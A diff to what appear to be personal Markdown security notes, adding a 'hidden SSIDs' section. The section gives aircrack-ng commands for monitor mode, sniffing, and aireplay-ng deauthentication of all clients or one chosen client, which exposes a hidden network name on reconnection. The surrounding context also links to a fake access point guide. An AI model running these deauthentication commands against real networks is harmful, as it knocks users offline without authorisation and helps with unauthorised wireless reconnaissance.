@@ -315,6 +315,30 @@ sudo iptables --table nat -A POSTROUTING -o wlan0 -j MASQUERADE
 
 - [Quick and easy fake WiFi access point in Kali](https://cybergibbons.com/security-2/quick-and-easy-fake-wifi-access-point-in-kali/)
 
+### hidden SSIDs
+
+```bash
+# setup
+./scripts/airmon-ng check kill
+./scripts/airmon-ng start wlp3s0
+
+# listen
+./airodump-ng wlp3s0mon
+
+# disconnect devices
+./aireplay-ng --ignore-negative-one -0 15 -a $NETWORK $BSSID wlp3s0mon
+# || disconnect specific device
+./aireplay-ng --ignore-negative-one -0 15 -c $CLIENT $BSSID -a $NETWORK $BSSID wlp3s0mon
+# check broadcasted SSID on reconnections reported by `airodump-ng`
+
+# teardown
+systemctl start avahi-daemon
+systemctl start NetworkManager
+./scripts/airmon-ng stop wlp3s0mon
+```
+
+- https://www.aircrack-ng.org/doku.php?id=airmon-ng
+
 # connection testing
 
 ```ps1
